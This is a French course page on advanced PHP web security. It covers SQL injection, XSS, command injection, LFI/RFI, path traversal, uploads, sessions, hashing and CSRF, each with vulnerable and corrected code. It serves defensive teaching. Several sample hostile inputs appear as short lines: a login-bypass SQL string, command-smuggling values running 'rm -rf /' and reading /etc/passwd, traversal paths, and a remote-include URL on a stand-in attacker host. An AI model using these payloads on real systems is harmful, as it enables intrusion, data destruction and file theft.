---
id: 02-php-avance
title: PHP - Avancé
sidebar_position: 2
tags: [programmation]
---

# PHP — Avancé

Les bases acquises, ce cours se concentre sur ce qui compte le plus pour ton profil : les **vulnérabilités web côté serveur** (leur mécanisme et leur prévention), et les concepts PHP avancés qui les entourent. C'est le cœur du pentest web et de la sécurité applicative.

## L'injection SQL : la faille reine

L'injection SQL (SQLi) est l'une des vulnérabilités les plus anciennes, les plus répandues et les plus dévastatrices. Le principe : quand une application construit une requête SQL en y insérant directement une entrée utilisateur, l'attaquant peut détourner la requête.

```php
<?php
// CODE VULNÉRABLE — ne JAMAIS faire ça
$user = $_POST["username"];
$pass = $_POST["password"];
$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$resultat = $db->query($sql);
```

L'attaque : si l'utilisateur saisit `admin' -- ` comme username, la requête devient :

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'
```

Le `--` commente le reste : la vérification du mot de passe **disparaît**, l'attaquant se connecte comme admin. Avec des techniques plus poussées (UNION, injection aveugle/blind), on peut extraire toute la base de données, voire exécuter des commandes.

**La parade : les requêtes préparées (prepared statements).** On sépare la structure de la requête (fixe) des données (variables), qui sont envoyées à part et jamais interprétées comme du SQL :

```php
<?php
// CODE SÛR — requête préparée avec PDO
$stmt = $db->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$user, $pass]);          // les données passent séparément
$resultat = $stmt->fetch();

// Variante avec paramètres nommés
$stmt = $db->prepare("SELECT * FROM users WHERE username = :user");
$stmt->execute(["user" => $user]);
```

Avec une requête préparée, le `admin' -- ` est traité comme une **valeur littérale** de username (une chaîne inoffensive), pas comme du code SQL. C'est la protection absolue contre l'injection SQL. **Règle : toujours des requêtes préparées, jamais de concaténation de variables dans du SQL.** PDO (PHP Data Objects) est l'interface moderne recommandée.

## Le XSS côté serveur : l'échappement de sortie

On a vu le XSS dans les cours HTML et JS. Côté PHP, la parade est d'**échapper toute donnée avant de l'afficher** dans du HTML :

```php
<?php
// VULNÉRABLE
echo "Bonjour " . $_GET["nom"];

// SÛR : htmlspecialchars convertit < > " & en entités HTML inertes
echo "Bonjour " . htmlspecialchars($_GET["nom"], ENT_QUOTES, 'UTF-8');
```

`htmlspecialchars` transforme `<script>` en `&lt;script&gt;`, qui s'affiche comme du texte au lieu d'être exécuté. C'est **la** fonction à appliquer sur toute donnée utilisateur insérée dans une page. Les frameworks de templates modernes (Twig, Blade) échappent automatiquement, ce qui réduit le risque d'oubli.

Le principe général de défense : **valider en entrée, échapper en sortie**. Valider que les données correspondent au format attendu quand elles arrivent, et les échapper selon le contexte (HTML, SQL, URL, JS) quand elles ressortent. Le bon échappement dépend du contexte — `htmlspecialchars` pour le HTML, requêtes préparées pour le SQL, `escapeshellarg` pour les commandes.

## L'injection de commandes (RCE)

Quand PHP exécute des commandes système avec une entrée utilisateur, c'est la porte ouverte à l'exécution de code à distance (RCE), la faille la plus grave :

```php
<?php
// CATASTROPHE — injection de commande
$ip = $_GET["ip"];
system("ping -c 4 " . $ip);
// Si ip = "8.8.8.8; rm -rf /", les deux commandes s'exécutent
// Si ip = "8.8.8.8; cat /etc/passwd", l'attaquant lit des fichiers

// PARADE : échapper les arguments
$ip = $_GET["ip"];
system("ping -c 4 " . escapeshellarg($ip));   // l'argument est neutralisé

// MIEUX : valider strictement l'entrée avant tout
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    system("ping -c 4 " . escapeshellarg($ip));
}
```

Les fonctions dangereuses à repérer en audit : `system()`, `exec()`, `shell_exec()`, `passthru()`, `` ` `` (backticks), `eval()`, `popen()`. Chaque fois qu'une entrée utilisateur les atteint, c'est un risque de RCE. `escapeshellarg` et la validation stricte sont les parades — mais l'idéal est d'éviter d'appeler le shell.

## Les inclusions de fichiers (LFI/RFI) et path traversal

PHP peut inclure des fichiers dynamiquement, ce qui crée deux classes de failles :

```php
<?php
// VULNÉRABLE — Local/Remote File Inclusion
$page = $_GET["page"];
include($page . ".php");
// page = "../../../../etc/passwd%00" → lit des fichiers arbitraires (LFI)
// page = "http://attaquant.fr/shell" → exécute du code distant (RFI, si activé)

// Path traversal sur la lecture de fichiers
$fichier = $_GET["file"];
echo file_get_contents("/var/www/uploads/" . $fichier);
// file = "../../../etc/passwd" → remonte l'arborescence et lit /etc/passwd
```

Le **path traversal** (`../../../`) permet de sortir du dossier prévu et d'accéder à des fichiers sensibles. La parade : valider strictement (liste blanche de pages autorisées), utiliser `basename()` pour retirer les composants de chemin, et `realpath()` pour vérifier que le chemin résolu reste dans le dossier autorisé.

```php
<?php
// PARADE : liste blanche
$pages_autorisees = ["accueil", "contact", "apropos"];
$page = $_GET["page"];
if (in_array($page, $pages_autorisees, true)) {
    include($page . ".php");
}
```

## L'upload de fichiers

Permettre l'upload de fichiers est risqué : si un attaquant uploade un `.php` et arrive à l'exécuter, c'est un webshell = contrôle total du serveur.

```php
<?php
// Points de contrôle pour un upload sûr
$fichier = $_FILES["upload"];

// 1. Vérifier le type réel (pas juste l'extension ou le Content-Type déclaré, falsifiables)
$type = mime_content_type($fichier["tmp_name"]);

// 2. Liste blanche d'extensions autorisées
$extensions_ok = ["jpg", "png", "pdf"];

// 3. Renommer le fichier (nom aléatoire, pas celui fourni par l'utilisateur)
$nouveau_nom = bin2hex(random_bytes(16)) . ".jpg";

// 4. Stocker HORS de la racine web, ou dans un dossier où PHP ne s'exécute pas
$destination = "/var/uploads_prives/" . $nouveau_nom;
move_uploaded_file($fichier["tmp_name"], $destination);
```

Les erreurs classiques : se fier à l'extension ou au `Content-Type` (tous deux contrôlés par l'attaquant), stocker dans un dossier web où le `.php` uploadé peut être appelé, garder le nom original. L'upload de webshell est un grand classique du pentest web.

## Les sessions et l'authentification

PHP gère les sessions pour maintenir l'état entre les requêtes (un utilisateur connecté) :

```php
<?php
session_start();

// Après une authentification réussie
$_SESSION["user_id"] = $user["id"];
$_SESSION["role"] = $user["role"];

// Vérifier l'authentification sur les pages protégées
if (!isset($_SESSION["user_id"])) {
    header("Location: /login.php");
    exit;
}

// Régénérer l'ID de session après connexion (contre le session fixation)
session_regenerate_id(true);
```

Les points de sécurité : régénérer l'ID de session après connexion (contre le **session fixation**), configurer les cookies de session en `HttpOnly` (inaccessibles au JS, limite le vol par XSS) et `Secure` (HTTPS uniquement), et gérer une expiration. Le vol de session (via XSS qui exfiltre le cookie) est une attaque courante — d'où le lien étroit entre XSS et compromission de compte.

## Le hachage des mots de passe

À relier à ton cours crypto. PHP fournit les bonnes fonctions, il faut les utiliser :

```php
<?php
// À l'inscription : hacher avec password_hash (utilise bcrypt/Argon2, salt automatique)
$hash = password_hash($_POST["password"], PASSWORD_DEFAULT);
// Stocker $hash en base

// À la connexion : vérifier
if (password_verify($_POST["password"], $hash_stocke)) {
    // mot de passe correct
}
```

`password_hash` / `password_verify` gèrent automatiquement le salt et utilisent un algorithme lent adapté (bcrypt par défaut, Argon2 disponible) — exactement les bonnes pratiques de ton cours crypto. **Ne jamais** stocker un mot de passe en clair, ni le hacher avec `md5()` ou `sha1()` (rapides, cassables). Voir un `md5($password)` dans du code PHP est un finding immédiat.

## La CSRF

La CSRF (Cross-Site Request Forgery, vue dans le cours HTML) : un site malveillant force le navigateur de la victime à envoyer une requête à un site où elle est connectée, exploitant ses cookies de session. La parade est le **token CSRF** :

```php
<?php
// Générer un token unique par session et l'inclure dans chaque formulaire
$_SESSION["csrf"] = bin2hex(random_bytes(32));
// Dans le formulaire : <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">

// À la réception, vérifier
if (!hash_equals($_SESSION["csrf"], $_POST["csrf"] ?? "")) {
    die("Token CSRF invalide");
}
```

Le token, imprévisible et lié à la session, ne peut pas être connu du site attaquant — la requête forgée échoue donc la vérification. Note `hash_equals` : comparaison en temps constant (comme pour les MAC dans ton cours crypto), pour éviter les timing attacks.

## La POO et les concepts modernes

PHP moderne a une POO complète, utilisée par tous les frameworks (Laravel, Symfony) :

```php
<?php
class Utilisateur {
    public function __construct(
        private string $nom,          // promotion de propriété (PHP 8)
        private string $email
    ) {}

    public function getNom(): string {
        return $this->nom;
    }
}

// Namespaces, autoloading (Composer), interfaces, traits...
```

L'écosystème moderne repose sur **Composer** (le gestionnaire de dépendances, équivalent de npm/pip) et des **frameworks** (Symfony, Laravel) qui intègrent nativement les protections de sécurité (requêtes préparées via ORM, échappement auto des templates, tokens CSRF, hachage). Utiliser un framework à jour élimine par défaut une grande partie des failles décrites ici — c'est pourquoi le code PHP vulnérable est souvent du vieux code « fait main » sans framework.

## Ce qu'il faut retenir

- **Injection SQL** : jamais de concaténation dans le SQL → **requêtes préparées (PDO)** systématiques. La faille reine du web.
- **XSS** : échapper toute sortie avec `htmlspecialchars`. Principe : **valider en entrée, échapper en sortie** selon le contexte.
- **Injection de commandes (RCE)** : repérer `system/exec/shell_exec/eval` ; `escapeshellarg` + validation, ou éviter le shell.
- **LFI/RFI et path traversal** (`../../`) : liste blanche, `basename`, `realpath`.
- **Upload** : ne jamais se fier à l'extension/Content-Type, renommer, stocker hors racine web (risque de webshell).
- **Sessions** : `session_regenerate_id`, cookies `HttpOnly`/`Secure` ; le vol de session découle souvent du XSS.
- **Mots de passe** : `password_hash`/`password_verify` (jamais md5/sha1) — cohérent avec ton cours crypto.
- **CSRF** : token imprévisible par session, vérifié avec `hash_equals`.
- Les **frameworks modernes** (Symfony/Laravel + Composer) intègrent ces protections par défaut ; le code vulnérable est souvent du vieux PHP artisanal.
